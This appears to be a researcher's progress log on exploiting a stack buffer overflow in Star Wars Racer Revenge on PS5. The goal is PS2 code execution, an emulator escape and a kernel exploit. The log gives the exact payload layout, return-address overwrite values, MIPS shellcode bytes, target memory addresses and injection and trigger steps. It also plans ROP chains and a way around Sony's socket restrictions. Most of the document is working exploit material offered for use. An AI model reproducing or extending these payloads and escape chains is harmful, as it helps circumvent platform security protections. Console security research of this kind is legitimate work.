# Star Wars Racer Revenge PS2 Exploit Progress

## Date: 2026-01-12 (Updated)

## Summary
Successfully achieved **PS2 code execution** via Hall of Fame buffer overflow in Star Wars Racer Revenge (CUSA03474) running on PS5 FW 4.03. This is the first step toward a mast1c0re-style emulator escape.

---

## What Was Achieved

### 1. Buffer Overflow Discovery
- **Vulnerability**: Hall of Fame player name `strcpy` without length check
- **Trigger**: Options → Hall of Fame (overflow happens when DISPLAYING names)
- **Documentation**: PSDevWiki confirms "Stack-Smash via unchecked Record Name length"

### 2. Memory Write Primitive
- **PS5 Write Address**: `0x800061B2D6` (in P[3].bin - PS2 RAM region)
- **Method**: Kernel R/W exploit writes directly to PS2 emulator memory
- **Persistence**: Changes persist through save/reload cycle

### 3. Critical Offsets Identified
| Offset | Purpose | Notes |
|--------|---------|-------|
| 0-267 | Padding | Can contain shellcode |
| 268-271 | Data pointer | Must be valid PS2 address (no null bytes!) |
| 272-381 | Padding | - |
| **382-385** | **$ra (Return Address)** | **Controls code execution!** |

### 4. PS2 Code Execution Confirmed
- Successfully redirected $ra to shellcode at `0x803032D6`
- Shellcode executed (game freeze before crash = infinite loop running)
- **We have full control of PS2 program counter**

---

## Key Technical Details

### Working Exploit Payload Structure
```
Bytes 0-3:     [SHELLCODE START - e.g., FF FF 29 11 for infinite loop]
Bytes 4-267:   41 padding (can hold more shellcode - 264 bytes available)
Bytes 268-271: 01 01 01 01 (valid PS2 pointer - NO NULL BYTES or strcpy stops!)
Bytes 272-381: 41 padding
Bytes 382-385: D6 32 30 80 ($ra = 0x803032D6 pointing to shellcode)
Bytes 386+:    41 padding (optional)
```

### PS2 Address Calculation
- P[3].bin offset `0x003032D6` = PS2 KSEG0 address `0x803032D6`
- KSEG0 = `0x80000000 + physical_offset`
- Our shellcode at buffer start = `0x803032D6`

### Null Byte Problem (CRITICAL)
- `strcpy` stops at null bytes!
- Pointer `00 10 30 00` terminates copy at byte 271
- Must use pointers WITHOUT null bytes: `01 01 01 01` works

### Confirmed Crash Values
| Test | Offset 268 | Offset 382 | Result |
|------|-----------|------------|--------|
| Invalid pointer | 41414141 | N/A | Crash @ 0x41414141 |
| Valid ptr + invalid $ra | 01010101 | DEADBEEF | Crash @ EFBEADDE (little-endian) |
| Valid ptr + shellcode $ra | 01010101 | D6323080 | **FREEZE then crash (code exec!)** |

---

## Shellcode Examples

### Simple Infinite Loop (4 bytes, null-free)
```mips
beq $t1, $t1, -1    # Branch to self forever
```
Bytes (little-endian): `FF FF 29 11`

### Memory Write Test (24 bytes)
```mips
lui $t0, 0xDEAD       # AD DE 08 3C
ori $t0, $t0, 0xBEEF  # EF BE 08 35
lui $t1, 0x8030       # 30 80 09 3C
ori $t1, $t1, 0x3232  # 32 32 29 35
sw $t0, 0x4141($t1)   # 41 41 28 AD  (writes DEADBEEF to 0x80307373)
beq $t1, $t1, -1      # FF FF 29 11  (infinite loop)
```

---

## Next Steps (Tomorrow)

### 1. Find Emulator Memory Layout
The mast1c0re escape requires finding these addresses in the Star Wars Racer emulator:
- **N status buffer** (was 0x897810 in Okage)
- **S status buffer** (was 0x897820 in Okage)
- **IOP RAM pointer** (was 0xAF6E38 in Okage)

**Action**: Dump the PS2 emulator's memory map:
- Look for regions with "eboot", "emu", "ps2" in name
- Find executable and data sections
- PS5 layout differs from PS4 - need to discover actual addresses

### 2. Dump Emulator Sections
Once we find where eboot is mapped:
- Dump .text section for ROP gadgets
- Dump .data section for buffer/pointer locations
- Analyze to find Star Wars Racer-specific offsets

### 3. Implement Emulator Escape
Following mast1c0re technique:
1. Overflow S status buffer to corrupt N status index
2. Use OOB write to corrupt IOP RAM pointer
3. Redirect IOP RAM from `0x9000000000` to eboot data area
4. PS2 writes now affect native x86-64 memory
5. Corrupt function pointers in eboot
6. Trigger ROP chain for native code execution

### 4. Chain to Kernel R/W via Socket-Free Poopsploit
- **Problem**: Sony removed socket privileges from ps2emu at FW 8.00+
- **Poopsploit** requires sockets for heap spray and address leak
- **Research Goal**: Find alternative spray/leak primitives that work from ps2emu
- **Your Advantage**: FW 4.03 has kernel R/W - can analyze what primitives are available

---

## NEW RESEARCH: Socket-Free Kernel Exploit Path

### The Socket Problem (Discovered 2026-01-12)
```
Current Poopsploit (Poops.java) requires:
- socket() syscall - BLOCKED from ps2emu on FW 8.00+
- 128 AF_INET6 sockets for heap spray - BLOCKED
- getsockopt() for address leak - BLOCKED
- pipe() for R/W primitive - ALLOWED
- dup() for FD manipulation - ALLOWED
```

### Research Plan
1. **Complete mast1c0re emulator escape** (in progress)
2. **Enumerate ps2emu privileges** using kernel R/W
3. **Find alternative spray primitives** (pipes? kqueue? files?)
4. **Find alternative leak primitives** (pipe metadata? error messages?)
5. **Implement socket-free Poopsploit**
6. **Test on FW 11.40**

### Gezine's Luac0re Status
- Achieved mast1c0re → Lua on Star Wars Racer Revenge
- Confirmed ps2emu has "dup privilege"
- Also blocked by socket removal
- Actively researching alternatives

---

## Mast1c0re Research Summary

### Key Sources
- CTurt's writeup: https://cturt.github.io/mast1c0re.html
- McCaulay's implementation: https://github.com/McCaulay/mast1c0re
- Works on PS5 FW 1.00-7.61 for PS2 backups

### Emulator Architecture
- Two processes: main app (eboot.bin) + compiler (ps2-emu-compiler.self)
- JIT compilation for PS2→x86-64
- 65MB JIT budget limit (Sony's mitigation)

### Native eboot Layout (Okage reference - ASLR disabled offsets)
| Address | Region | Notes |
|---------|--------|-------|
| 0x400000 | Executable (.text) | ROP gadgets here |
| 0x750000 | Read-only (.rodata) | Constants |
| 0x768000 | Read-write (.data) | Buffers, pointers |
| **0x897810** | **N status buffer** | 16-byte communication buffer |
| **0x897820** | **S status buffer** | 16-byte, adjacent to N |
| 0x897890 | N status index | 4-byte index |
| 0x8978A0 | S status index | 4-byte index |
| **0xAF6E38** | **IOP RAM pointer** | Points to 0x9000000000 |

**These are relative offsets - PS5 uses ASLR!**

**Key distance**: N_STATUS_BUFFER to IOP_RAM_POINTER = `0x25F628` bytes (~2.4MB)

### The IOP RAM Pointer Trick
```c
// Emulator code when PS2 writes to IOP RAM:
*(unsigned int *)(iopram + (ulong)address) = value;

// iopram pointer at 0xAF6E38, normally = 0x9000000000
// If corrupted to 0x4100000000, PS2 writes go to native eboot memory!
```

### Finding These Addresses on PS5
Use the `ps2emu_memory_finder.js` script:
1. Searches for 0x9000000000 value (IOP RAM pointer signature)
2. Calculates N/S buffer locations based on known offset (0x25F628)
3. Dumps memory map to identify eboot sections

---

## Files & Locations

### On PS5
- Save location: `/user/home/*/savedata/CUSA03474/`
- Memory region: P[3].bin at `0x8000318000` (PS2 RAM)
- Write target: `0x800061B2D6` (Hall of Fame name)

### Game Info
- Title: Star Wars Racer Revenge
- Package ID: CUSA03474
- PS2 Serial: SLUS-20268
- Physical disc required

---

## Hardware Setup
- PS5 on FW 4.03 (kernel exploit working)
- PS5 Pro on FW 11.40 (backup system)
- Star Wars Racer Revenge physical disc
- ps5debug + ps4reaper on Windows for memory access

---

## STEP 1.1: Dump Memory Map with ps2emu_memory_finder.js

### Prerequisites
1. PS5 on FW 4.03 with kernel exploit running
2. Star Wars Racer Revenge game loaded (main menu)
3. umtx2-cfi-tester exploit page open

### Integration Steps
Add this to `main.js` after the kernel exploit returns:

```javascript
// After: const k = await umtx2(...);
// Add the ps2emu_memory_finder.js code, then call:
await findMast1coreAddresses(k);
```

### What to Look For
1. **IOP RAM Pointer**: Look for value `0x0000009000000000` in writable regions
2. **Eboot .text**: Low executable address (likely 0x4xxxxx range with ASLR)
3. **PS2 RAM**: Mapped at `0x8000xxxxxxxx` range (we already know P[3].bin here)

### Expected Output
```
=== PS2 Emulator Memory Analysis ===
Looking for mast1c0re-critical addresses...
Searching for process: ps2
Found: eboot.bin (PID: xxx) @ 0xffffxxxxxxxxxxxx
...
EXACT IOP RAM PTR @ 0xXXXXXXXXXX: 0x0000009000000000
Estimated N_STATUS_BUFFER: 0xXXXXXXXXXX
Estimated S_STATUS_BUFFER: 0xXXXXXXXXXX
```

### If Script Fails
1. Check process name - might not contain "ps2" or "emu"
2. Use `listAllProcesses(k)` to see all running processes
3. Memory scan might be too slow - increase timeout or reduce region size

---

## Quick Exploit Test (if needed)
Write this hex to `0x800061B2D6`:
```
FF FF 29 11 41 41 41 41 41 41 41 41 41 41 41 41
[... 41 padding until offset 268 ...]
01 01 01 01 [offset 268-271: valid pointer]
[... 41 padding until offset 382 ...]
D6 32 30 80 [offset 382-385: $ra to shellcode]
```
Result: Game should freeze (PS2 code execution confirmed)

---

## LUAC0RE INTEGRATION (2026-01-14)

### Shellcode Extraction
Luac0re shellcode extracted from `Luac0re/ps2/BASLUS-20268.psu`:
- **Size**: 15,796 bytes (0x3DB4)
- **Entry**: `lui $sp, 0x01C0` (0x3C1D01C0)
- **File**: `research/luac0re_shellcode_ready.bin`

### Star Wars Racer Addresses (from Luac0re shellcode.c)
| Symbol | Address | Notes |
|--------|---------|-------|
| N_STATUS_BUFFER | `0x3A2448` | 16-byte IOP command buffer |
| S_STATUS_BUFFER | `0x3A2458` | Adjacent, overflow target |
| IO_REGISTER_HANDLERS | `0x5BFB1A0` | Function pointer table |
| ROP_CHAIN_LOCATION | `0x500000` | Where shellcode goes |

### Injection Instructions

#### Step 1: Write Luac0re Shellcode to PS2 Memory
```
Address: 0x8000000500000 (native PS5 address)
File:    research/luac0re_shellcode_ready.bin
Size:    15,796 bytes
```

#### Step 2: Inject Hall of Fame Payload
```
Address: 0x800060B7D2
Size:    386 bytes
File:    research/hall_of_fame_payload.bin
```

**Payload hex (386 bytes)**:
```
Offset 0x000-0x10B: 41 (268 times) - padding
Offset 0x10C-0x10F: 01 01 01 01   - valid pointer (no nulls)
Offset 0x110-0x17D: 41 (110 times) - more padding
Offset 0x17E-0x181: 00 00 50 80   - $RA = 0x80500000
```

#### Step 3: Trigger
1. Start Star Wars Racer Revenge
2. Go to Options → Hall of Fame
3. Shellcode executes → emulator escape → Lua loads

### Generated Files
| File | Purpose |
|------|---------|
| `Luac0re/` | Cloned repository |
| `research/extracted_shellcode.bin` | Raw shellcode from PSU |
| `research/luac0re_shellcode_ready.bin` | Ready for injection |
| `research/hall_of_fame_payload.bin` | Hall of Fame trigger payload |
| `research/luac0re_hall_of_fame_payload.py` | Payload generator |
| `research/luac0re_shellcode_loader.py` | Shellcode preparation |

---

## Files Created

| File | Purpose |
|------|---------|
| `research/ps2emu_memory_finder.js` | Script to find mast1c0re addresses |
| `research/star_wars_racer_exploit_progress.md` | This documentation |

---

## References

- [CTurt's mast1c0re writeup](https://cturt.github.io/mast1c0re.html)
- [McCaulay's mast1c0re implementation](https://github.com/McCaulay/mast1c0re)
- [Poopsploit source (Poops.java)](https://github.com/iaceene/HENloader_Source/blob/main/external/Poops.java)
